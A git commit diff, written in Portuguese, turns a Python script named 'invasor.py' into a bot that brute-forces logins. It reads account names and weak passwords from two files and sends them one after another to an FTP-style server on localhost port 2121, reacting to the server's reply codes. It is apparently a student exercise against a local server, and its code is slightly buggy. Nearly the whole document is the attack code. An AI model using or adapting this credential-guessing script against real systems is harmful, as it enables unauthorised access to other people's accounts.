ba92b4adadb52db112bae4fa83e31aca9e1603ae
JulioCaue <juliocaue22@gmail.com>
2025-11-30 20:18:38 -0300

    Script de  invasão  refeito para se tornar um bot que vai por todos os usuarios e senhas de dois arquivos distintos e envia cada um até todos serem esgotados.

--- invasor.py
+++ invasor.py
@@ -1,19 +1,42 @@
 import socket
-
+import time
 class Invasor:
     def __init__(self):
         self.host='localhost'
         self.porta=2121
-        self.cliente=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-
+        self.invasor=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.lista_de_nomes=[]
+        self.lista_de_senhas=[]
     def invadir(self):
-        self.cliente.connect((self.host,self.porta))
-        while True:
-            mensagem_recebida=self.cliente.recv(1024).decode()
-            print(mensagem_recebida)
-            self.cliente.send(input('>>> ').encode())
-            if mensagem_recebida=='221':
-                break
+        with open ('nomes_de_conta_servidor.txt','r') as dump_de_nomes:
+            for nome in dump_de_nomes:
+                self.lista_de_nomes.append(nome)
+        with open ('senhas_fracas_servidor.txt','r') as dump_de_senhas:
+            for senha in dump_de_senhas:
+                self.lista_de_senhas.append(senha)
+
+
+        self.invasor.connect((self.host,self.porta))
+        quantidade_de_senhas=199
+        index_nomes_atual=0
+        index_senha_atual=0
+
+        while index_senha_atual!=quantidade_de_senhas:
+            index_senha_atual=int(index_senha_atual)
+            mensagem_recebida=self.invasor.recv(1024).decode()
+            if mensagem_recebida.startswith('220'):
+                self.invasor.send((f'user {self.lista_de_nomes[index_nomes_atual]}').encode())
+                print (f'Enviado usuario {self.lista_de_nomes[index_nomes_atual]}')
+                index_nomes_atual+=1
+            elif mensagem_recebida.startswith('331'):
+                self.invasor.send((f'pass {self.lista_de_senhas[index_senha_atual]}').encode())
+                print (f'Enviado senha {self.lista_de_senhas[index_senha_atual]}')
+                index_senha_atual+=1
+            elif mensagem_recebida.startswith('530'):
+                self.invasor.send((f'user {self.lista_de_nomes[index_nomes_atual]}').encode())
+                print (f'Enviado usuario {self.lista_de_senhas[index_senha_atual]}')
+                index_nomes_atual+=1
+            time.sleep(0.2)
 
 
 
@@ -21,3 +44,4 @@ class Invasor:
 programa_invadir=Invasor()
 
 programa_invadir.invadir()
+
